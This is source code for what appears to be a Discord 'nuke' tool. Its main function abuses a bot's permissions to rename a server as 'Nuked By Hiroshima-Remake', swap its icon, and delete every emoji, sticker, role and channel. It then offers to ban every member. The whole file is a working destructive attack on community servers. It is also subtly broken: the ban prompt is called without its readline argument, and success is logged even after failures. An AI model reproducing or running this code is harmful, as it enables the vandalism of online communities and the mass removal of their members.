import readline from "readline";
import { ChannelManager } from "./channel.js";
import { RoleManager } from "./role.js";
import checkPermissions from "./checkPermission.js";
import { client } from "../index.js";
import { selectedGuild } from "../alert/getGuild.js";
import EmojiManager from "./emoji.js";
import pc from "picocolors";
import logger from "../logging/logger.js";
import MemberManager from "./member.js";

function initializeReadline() {
  return readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });
}

async function askQuestion(query, rl) {
  return new Promise((resolve) => {
    rl.question(query, (answer) => {
      resolve(answer);
    });
  });
}

export default async function nuke() {
  const guild = await client.guilds.fetch(selectedGuild.id);
  const bot = await guild.members.fetch(client.user.id);

  if (!(await checkPermissions(bot))) return;

  console.log(pc.green(`Nuking Server: ${guild.name}`));
  console.log(pc.yellow("Changing the server name..."));

  await logger.info("Changing the server name...");
  try {
    await guild.setName("Nuked By Hiroshima-Remake");
  } catch (error) {
    await logger.error("Failed to change the server name!");
    console.log(pc.red("Failed to change the server name!"));
  }

  console.log(pc.green("Server name changed successfully"));
  await logger.info("Server name changed successfully");

  console.log(pc.yellow("Changing server icon..."));
  await logger.info("Changing server icon...");
  try {
    await guild.setIcon(
      "https://i.ibb.co/WN9MmvJs/the-kingth-of-kutet-thukuna.jpg"
    );
  } catch (error) {
    await logger.error("Failed to change the server icon!");
    console.log(pc.red("Failed to change the server icon!"));
  }

  console.log(pc.green("Server icon changed successfully"));
  await logger.info("Server icon changed successfully");

  await Promise.all([
    EmojiManager.deleteEveryEmoji(guild),
    EmojiManager.deleteEverySticker(guild),
    RoleManager.deleteEveryRole(guild),
    ChannelManager.deleteEveryChannel(guild),
  ]);

  const rl = initializeReadline();

  await logger.info("asking to ban everyone");
  const answer = await askQuestion(
    pc.yellow("Do you want to ban everyone from the server? (y/n): ")
  );

  if (answer.toLowerCase().startsWith("y")) {
    await logger.info("user wants to ban everyone");
    await MemberManager.banEveryone(guild);
  }

  rl.close();

  await ChannelManager.createChannel(guild);
}
